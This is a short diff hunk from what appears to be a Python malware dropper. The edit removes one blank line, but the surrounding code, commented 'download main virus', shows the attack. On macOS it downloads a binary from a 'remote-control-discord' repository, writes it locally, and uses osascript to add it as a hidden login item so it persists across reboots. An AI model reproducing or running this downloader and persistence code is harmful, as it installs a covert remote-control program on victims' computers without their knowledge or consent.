@@ -17,7 +17,6 @@ except FileNotFoundError:
     pass
 
 # download main virus
-
 if platform == "darwin":
     open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-mac", allow_redirects=True).content)
     system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{localfile}\", hidden:true}}' > /dev/null")
